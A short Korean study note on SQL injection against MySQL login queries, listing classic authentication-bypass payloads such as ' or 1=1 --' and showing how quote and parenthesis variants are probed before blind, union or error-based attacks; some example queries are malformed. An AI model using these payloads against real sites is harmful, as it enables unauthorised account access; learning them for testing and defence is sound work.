# GENERAL SQL injection
<br>
<br>

__Mysql 대표적인 login query__
***

~~~~sql

SELECT * FROM member WHERE userId = 'input id' and userPw = 'input pw';

-> 입력받은 id , pw 체크

SELECT * FROM member WHERE userId = 'input id';

-> 입력받은 id 만 체크한 후 서버 파일에서 입력받은 id 와 Mysql 결과의 비밀번호와 비교

~~~~
<br><br><br>

__Mysql Login Sql injection__
***

~~~~sql

' or 1=1 --'
' or 1 #'

입력 결과

SELECT * FROM member userId = '' or 1=1 --'' and userPw = '';

-> 1=1 or 1 참이 되는 값을 주입하여 USER 리스트를 출력하게함
~~~~
<br><br>

이렇게 간단하고 심플한

' or 1=1 --' 
" or 1=1 "

같은 쿼리를 웹사이트의 취약점을 찾을때 자주 쓰인다.

먼저 말 그대로 심플하고 간결하지만 해당 웹 사이트의 페이로드를 찾기위해 쓰인다.

예를 들자면
```sql
SELECT * FROM member id='' and pw='';
SELECT * FROM member id="" and pw="";
SELECT * FROM member id=('') and pw=('');
SELECT * FROM member (id='') and (pw='');
SELECT * FROM member id=("") and pw=("");
SELECT * FROM member (id="") and (pw="");
```

이처럼 취약점을 찾을려고하는 사이틔의 로그인 또는 회원가입 등등

mysql 에 전송되는 쿼리가 어떻게 될지 개발자만 알수있기때문에

' or 1=1 --' 같은 간단한 쿼리로 페이로드를 파악한후에 

__blind sqli , union based sqli , error based sqli__ 등등

응용하여 공격을 한다.

만약 자신이 어떤 쿼리를 전송하는지 모르는 상태에서 일반적인 sqli attack 시도한다면

이런식으로 적용될 수 도있다.

```sql
SELECT * FROM member id="" and pw="";
# 해당 쿼리로 Login 체크

' or 1=1 --'
SELECT * FROM member id="' or 1=1 --'" and pw="";
" or 1=1 --"
SELECT * FROM member id="" or 1=1 --"" and pw="";
```

이처럼 경우의 수를 파악하여 시도를 한다음
참값이 된다면 해당 페이로드를 파악한 후 에 이어서 attakc 하는것이다.

### 마무리

sql injection 을 아무데서나 시도하면 잘못하다간 끌려간다.

<p style="color:red;">\ * (삐뽀삐뽀) * /</p>

![삐뽀삐뽀](./image/pooleeee.png)